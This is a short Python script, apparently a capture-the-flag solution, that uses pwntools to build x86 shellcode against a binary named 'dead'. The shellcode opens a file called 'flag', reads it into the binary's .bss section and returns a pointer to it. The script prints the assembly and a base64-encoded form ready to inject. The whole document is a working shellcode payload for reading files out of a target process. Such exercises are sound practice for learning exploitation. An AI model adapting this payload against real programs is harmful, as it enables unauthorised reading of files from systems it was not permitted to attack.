from pwn import *

from base64 import b64encode

if __name__ == "__main__":
    context.log_level = "error"

    binary = ELF("dead")
    context.binary = binary

    # read flag into the .bss section of the binary
    flag_addr = binary.bss()

    payload = f"""
    // push registers modified by syscalls onto stack for restoring later
    push ebx
    push ecx
    push edx

    // open the `flag` file for reading
{shellcraft.open("flag")}

    // read the contents of `flag` into the .bss section of memory (40 bytes is arbitrary)
{shellcraft.read("eax", flag_addr, 40)}

    // return a pointer (address) to the contents of `flag`
    mov eax, {hex(flag_addr)}

    // move stack pointer back down (up?) since it was moved while setting up the open syscall
    add esp, 8

    // restore registers back to original values
    pop edx
    pop ecx
    pop ebx

    // return :)
    ret
    """

    print(payload)
    print(b64encode(asm(payload)).decode())
